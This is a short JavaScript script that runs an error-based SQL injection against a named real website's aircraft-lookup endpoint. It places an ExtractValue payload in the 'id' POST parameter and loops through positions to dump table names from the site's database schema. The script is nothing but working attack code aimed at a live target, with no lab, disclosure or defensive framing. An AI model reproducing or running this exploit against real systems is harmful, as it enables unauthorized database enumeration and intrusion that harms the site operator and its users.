var baseURL        = 'https://www.aircraftclubs.com/functions/aircraft/getAircraft.php',
strInjectParam = 'id',
strInject      = " ExtractValue(null,concat(0x3a,(select table_name from information_schema.tables limit {start},1))) = 1 ",
reg            = /'(.+)'/,
tables         = [];

function query( pos ){
var str = strInject.replace('{start}', pos);
$.ajax({
url:baseURL,
method:'POST',
data:{
id:str,
a:'v'
},
success:function( data, textStatus, jqXHR ){
var aResults = reg.exec(data);

if( aResults && aResults.length ){
var table = aResults[1].substring(1);

tables.push(table);
console.log(table);
}else{
console.log(data);
}
},
error:function( jqXHR, textStatus, errorThrown ){
debugger;
}
});
}

function run( nCurIndex, nStopAt ){
query(nCurIndex++);
//console.log(nCurIndex++);
setTimeout( function(){
if( nCurIndex < nStopAt || tables[tables.length-1] == tables[tables.length-2]){
run( nCurIndex, nStopAt );
}else{
console.log(tables);
}
},2000)
}
run(0,150);
